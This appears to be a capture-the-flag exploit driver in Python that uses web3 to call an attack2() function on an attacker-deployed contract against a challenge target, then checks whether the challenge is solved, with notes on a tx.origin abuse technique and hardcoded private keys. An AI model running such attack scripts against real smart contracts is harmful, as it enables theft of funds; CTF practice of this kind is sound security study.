from web3 import Web3
import json
from web3.gas_strategies.rpc import rpc_gas_price_strategy


x = {
    "PrivateKey": "0x99558400ac194666dadd51557d76f937776c10d50f3a00e63a4c4718073ddf9d",
    "Address": "0x31d449b682Ee3A0D16f18456A9F9EEBF3a78Ce12",
    "TargetAddress": "0xb5Dc77aBd46D2100162b62Bf0D852129D1394276",
    "setupAddress": "0x14322A4b36643E22A7cD2Ba5F25191413d38fEE3"
}

PrivateKey =    x["PrivateKey"]
Address =       x["Address"] 
TargetContract = x["TargetAddress"]
SetupContract =  x["setupAddress"]

Target2Address = "0x31d449b682Ee3A0D16f18456A9F9EEBF3a78Ce12"
Target2Contract = "0x63E87c1468b1Ed76C9644119e58Cd9d2A72960FD"

url = 'http://159.65.52.96:31940/rpc'

w3 = Web3(Web3.HTTPProvider(url))
block_number = w3.eth.block_number
print(block_number)

account_address = Address
balance = w3.eth.get_balance(account_address)
print(balance)

#solcjs --abi --bin Setup.sol #generate .abi .bin
#with open('Setup_sol_Setup.abi','r') as f:
#       abi = json.load(f)

#contract_instance = w3.eth.contract(address=SetupContract, abi=abi)

account_from = {
        'private_key': PrivateKey,
        'address': account_address,
}

#construct_txn = contract_instance.constructor().buildTransaction(
#       {
#               'from': account_from['address'],
#               'nonce': w3.eth.get_transaction_count(account_from['address']),
#	       'value': 1
#       }
#)

#tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
#tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
#tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

with open('Contract_sol_Contract.abi','r') as f:
        abi = json.load(f)
contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)
construct_txn = contract_instance2.functions.attack2().build_transaction(
        {
                'from': account_from['address'],
                'nonce': w3.eth.get_transaction_count(account_from['address']),
                #'from': Target2Address,
                #'nonce': w3.eth.get_transaction_count(Target2Address),
                'chainId': w3.eth.chain_id,
		#'value' : 1
                #"gasPrice": w3.to_wei(50, 'gwei'),
                #"gas": 21000,
                #"value": w3.to_wei("0", "ether"),
        }
)
tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')

with open('Setup_sol_Setup.abi','r') as f:
        abi = json.load(f)

contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
number = contract_instance.functions.isSolved().call()

print(f'The current number stored is: { number } ')


'''
https://ctftime.org/writeup/31583
https://0xsage.medium.com/ethernaut-lvl-4-walkthrough-how-to-abuse-tx-origin-msg-sender-ef37d6751c8

forge init . --no-git

forge create src/Contract.sol:Contract --rpc-url http://209.97.176.174:31323/rpc --private-key 0x643f9dae7f3636d00fddb4236351c6136001b2cb5641b49ea1f72c327e5f1981
[⠰] Compiling...
[⠔] Compiling 1 files with 0.8.20
[⠒] Solc 0.8.20 finished in 40.18ms
Compiler run successful!
Deployer: 0x31d449b682Ee3A0D16f18456A9F9EEBF3a78Ce12
Deployed to: 0x63E87c1468b1Ed76C9644119e58Cd9d2A72960FD
Transaction hash: 0xfcbc1aca59dc9b42ce5c917c38d28b7ba60488ab115b25aa9c425ac6513709e0


Change the address in Contract.sol, align with TargetAddress in rpc url
Change the address in dec.py, align with the new deplyed address by forge

'''
